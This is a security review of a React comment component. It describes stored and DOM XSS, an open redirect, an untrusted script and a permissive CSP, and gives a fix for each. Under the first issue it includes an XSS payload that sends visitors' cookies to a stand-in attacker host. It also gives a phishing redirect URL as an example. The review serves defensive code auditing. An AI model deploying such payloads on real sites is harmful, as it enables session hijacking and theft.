# Security Review: `CommentSection`

## Critical Vulnerabilities

### 1. Stored XSS via `dangerouslySetInnerHTML` (Critical)

```typescript
{comments.map(c => <div key={c.id} dangerouslySetInnerHTML={{ __html: c.body }} />)}
```

User-supplied `comment.body` is rendered as raw HTML with zero sanitization. Any attacker can store a payload like `<img src=x onerror="document.location='https://evil.com/steal?c='+document.cookie">` in a comment and it executes for every visitor.

**Fix**: Sanitize with DOMPurify before rendering, or use plain text rendering.

```typescript
import DOMPurify from 'dompurify';
// ...
<div key={c.id} dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(c.body) }} />
```

If rich text is not needed, drop `dangerouslySetInnerHTML` entirely and render `c.body` as text.

### 2. DOM XSS via `innerHTML` (Critical)

```typescript
const div = document.createElement('div');
div.innerHTML = comment.body;
```

Same unsanitized input, same XSS vector, but through direct DOM manipulation. This function also bypasses React's virtual DOM, creating potential memory leaks and inconsistent state.

**Fix**: Remove this function. It duplicates the JSX rendering and is not used in the return value. If needed, use `DOMPurify.sanitize()` or `textContent` instead of `innerHTML`.

### 3. Open Redirect (High)

```typescript
const profileUrl = new URLSearchParams(window.location.search).get('redirect');
if (profileUrl) window.location.href = profileUrl;
```

An attacker crafts a link like `https://yourapp.com/comments?redirect=https://evil.com/phishing` and any user who clicks it is silently redirected. This enables phishing and credential theft.

**Fix**: Validate the redirect target against an allowlist of trusted origins.

```typescript
const ALLOWED_ORIGINS = ['https://yourapp.com'];
const profileUrl = new URLSearchParams(window.location.search).get('redirect');
if (profileUrl) {
  try {
    const url = new URL(profileUrl, window.location.origin);
    if (ALLOWED_ORIGINS.includes(url.origin)) {
      window.location.href = url.href;
    }
  } catch {
    // invalid URL, ignore
  }
}
```

### 4. Untrusted Third-Party Script (High)

```html
<script src="https://cdn.analytics.com/v3/tracker.js"></script>
```

Loading an external script gives that third party full JavaScript execution in your origin. If `cdn.analytics.com` is compromised or serves malicious code, it has access to cookies, DOM, and user sessions. The `<script>` tag inside JSX also does not execute in React -- it is inert, which suggests this was intended to be loaded differently and may be misconfigured.

**Fix**: Remove the inline script tag. Load analytics via a package manager or through a controlled tag manager. If external loading is required, use Subresource Integrity (SRI) hashes and restrict the CSP.

### 5. Dangerously Permissive CSP (High)

```
Content-Security-Policy: default-src *; script-src 'unsafe-inline' 'unsafe-eval' *;
```

This CSP provides effectively no protection:
- `default-src *` allows loading resources from any origin.
- `script-src 'unsafe-inline' 'unsafe-eval' *` permits inline scripts, `eval()`, and scripts from any domain. This defeats the entire purpose of CSP as an XSS mitigation layer.

**Fix**: Tighten to specific origins with nonce-based inline scripts.

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self'; img-src 'self' https:; connect-src 'self' https://api.yourapp.com;
```

## Summary

| # | Issue | Severity | CWE |
|---|-------|----------|-----|
| 1 | Stored XSS via `dangerouslySetInnerHTML` | Critical | CWE-79 |
| 2 | DOM XSS via `innerHTML` | Critical | CWE-79 |
| 3 | Open redirect from query param | High | CWE-601 |
| 4 | Untrusted third-party script | High | CWE-829 |
| 5 | Permissive CSP negates all mitigations | High | CWE-1021 |

All five issues are exploitable independently. Together they form a compounding attack surface: the permissive CSP (5) removes the browser-level safety net that would otherwise mitigate the XSS vectors (1, 2), while the open redirect (3) provides a delivery mechanism for phishing attacks.
